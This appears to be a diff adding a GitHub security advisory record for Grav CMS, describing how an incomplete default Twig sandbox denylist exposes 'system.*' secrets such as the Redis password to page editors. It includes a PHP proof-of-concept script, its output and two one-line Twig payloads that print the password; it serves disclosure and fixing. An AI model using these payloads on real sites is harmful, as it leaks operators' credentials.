@@ -1,0 +1,72 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-xjw5-q542-3vmr",
+  "modified": "2026-09-17T20:27:05Z",
+  "published": "2026-09-17T20:27:05Z",
+  "aliases": [
+    "CVE-2026-76846"
+  ],
+  "summary": "Grav: config_denied_paths default list omits `system`, exposing real secrets (e.g. system.cache.redis.password) via the Twig sandbox when config_access is enabled",
+  "details": "## Summary\n\n`system/config/security.yaml`'s default `twig_sandbox.config_denied_paths` list\n(`plugins`, `streams`, `security`, `backups`, `scheduler`) omits the `system` prefix.\nWhen an operator enables the documented, non-default `twig_content.config_access: true`\nsetting (intended to safely expose low-sensitivity values like `site.title` to\neditor-authored Twig content), any real secret stored under `system.*` , for example\n`system.cache.redis.password` , is also exposed, both via `config.get(...)` and via\n`config.toArray()`, to any user with page-edit permission.\n\nThis is a follow-up gap in the fix for GHSA-j274-39qw-32c9 (config.toArray() secret\nexfiltration): that fix correctly introduced a `SandboxConfig` facade with a denylist,\nbut the shipped default denylist is incomplete.\n\n## Environment used to verify\n\n- Grav commit at HEAD of the default branch, `GRAV_VERSION` `2.0.15`\n- PHP 8.3.6 with curl, zip, dom, gd extensions installed\n- Full `composer install --no-dev` run against the real repository (no mocked\n  dependencies) so the actual `Grav\\Common\\Config\\Config` and\n  `Grav\\Common\\Twig\\Sandbox\\SandboxConfig` classes could be exercised directly\n\n## Commands run to set up the verification environment\n\n```bash\ngit clone https://github.com/getgrav/grav.git\ncd grav\n\n# install missing PHP extensions required by composer.json\napt-get install -y php8.3-curl php8.3-zip php8.3-xml php8.3-gd\n\n# composer.phar fetched directly from GitHub releases\ncurl -sL -o /tmp/composer.phar \\\n  \"https://github.com/composer/composer/releases/latest/download/composer.phar\"\n\nCOMPOSER_ALLOW_SUPERUSER=1 php /tmp/composer.phar install --no-dev --no-interaction\n```\n\n## Proof of Concept\n\nConfirmed the real, currently-shipped config field first, rather than assuming one:\n\n```bash\ngrep -n \"redis\" -A3 system/config/system.yaml\n#   redis:\n#     socket: false\n#     password:                # <- system.cache.redis.password, a real field\n#     database:\n\ngrep -n \"cache.redis.password\" -A6 system/blueprints/config/system.yaml\n#   cache.redis.password:      # <- confirmed exposed in the admin UI as \"REDIS Password\"\n#     type: text\n```\n\n`sandbox_test.php` , loads the real classes via the real autoloader, no mocking of\n`Config` or `SandboxConfig` themselves:\n\n```php\n<?php\nrequire 'vendor/autoload.php';\n\nuse Grav\\Common\\Config\\Config;\nuse Grav\\Common\\Twig\\Sandbox\\SandboxConfig;\n\n// Real field: system.cache.redis.password\n// (system/config/system.yaml line 138; blueprint in\n// system/blueprints/config/system.yaml, \"cache.redis.password\")\n$configTree = [\n    'system' => [\n        'cache' => [\n            'driver' => 'redis',\n            'redis' => [\n                'server'   => '10.0.0.5',\n                'password' => 'REAL_REDIS_PASSWORD_ABC123_SHOULD_NOT_LEAK',\n            ],\n        ],\n    ],\n    'plugins' => [\n        'someplugin' => ['api_key' => 'plugin-secret-should-be-blocked'],\n    ],\n    'site' => ['title' => 'My Site'],\n];\n\n$config = new Config($configTree);\n\n// exact default list shipped in system/config/security.yaml\n$defaultDeniedPaths = ['plugins', 'streams', 'security', 'backups', 'scheduler'];\n\n$sandboxConfig = new SandboxConfig($config, $defaultDeniedPaths);\n\necho \"plugins.someplugin.api_key: \";\nvar_dump($sandboxConfig->get('plugins.someplugin.api_key', 'REDACTED'));\n\necho \"system.cache.redis.password: \";\nvar_dump($sandboxConfig->get('system.cache.redis.password', 'REDACTED'));\n\nprint_r($sandboxConfig->toArray());\n```\n\nRun:\n\n```bash\nphp sandbox_test.php\n```\n\nOutput:\n\n```\nplugins.someplugin.api_key: string(8) \"REDACTED\"\n\nsystem.cache.redis.password: string(42) \"REAL_REDIS_PASSWORD_ABC123_SHOULD_NOT_LEAK\"\n\nArray\n(\n    [system] => Array\n        (\n            [cache] => Array\n                (\n                    [driver] => redis\n                    [redis] => Array\n                        (\n                            [server] => 10.0.0.5\n                            [password] => REAL_REDIS_PASSWORD_ABC123_SHOULD_NOT_LEAK\n                        )\n\n                )\n\n        )\n\n    [site] => Array\n        (\n            [title] => My Site\n        )\n\n)\n```\n\n`plugins.*` is correctly redacted; `system.cache.redis.password` is not, and appears in\nfull both via targeted `get()` and via bulk `toArray()`.\n\n## Confirming the Twig-reachable path is real\n\n`system/config/security.yaml`'s sandbox policy explicitly allow-lists `SandboxConfig`'s\nmethods for use inside sandboxed page-content templates:\n\n```yaml\n- class: 'Grav\\Common\\Twig\\Sandbox\\SandboxConfig'\n  methods: 'get, toarray, value, offsetget, offsetexists'\n```\n\nSo, with `twig_content.process_enabled: true` and `twig_content.config_access: true`\nboth set (both documented, operator-controlled settings), a page containing:\n\n```twig\n{{ config.get('system.cache.redis.password') }}\n```\n\nor\n\n```twig\n{{ config.toArray() }}\n```\n\nrenders the real Redis password directly into the page output for any user with\npage-edit permission.\n\n## Impact\n\nAny site that (a) uses Redis for caching with a password set, and (b) has enabled the\ndocumented `config_access` opt-in (intended only to expose things like `site.title`),\nexposes that Redis password , and potentially other future `system.*` secrets , to\nevery user with page-edit access, not just administrators. This defeats the purpose of\nthe redaction list added in GHSA-j274-39qw-32c9 for any deployment using this specific\ncombination of otherwise-legitimate settings.\n\n## Suggested fix\n\nAdd `system` to the default `config_denied_paths` list in\n`system/config/security.yaml`, or invert the model to an allowlist (e.g. `site`, and\nany other subtree confirmed non-sensitive) so a future secret-bearing config key added\nunder `system.*` doesn't silently bypass the sandbox by default.\n\n## Affected component\n\n- `system/config/security.yaml`, `twig_sandbox.config_denied_paths` default value\n- `system/src/Grav/Common/Twig/Sandbox/SandboxConfig.php` (behaves correctly given its\n  input; the gap is in the default list passed to it)\n```",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.16"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 2.0.15"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-xjw5-q542-3vmr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-76846"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/grav-before-information-disclosure-via-twig-sandbox"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-522"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-09-17T20:27:05Z",
+    "nvd_published_at": null
+  }
+}
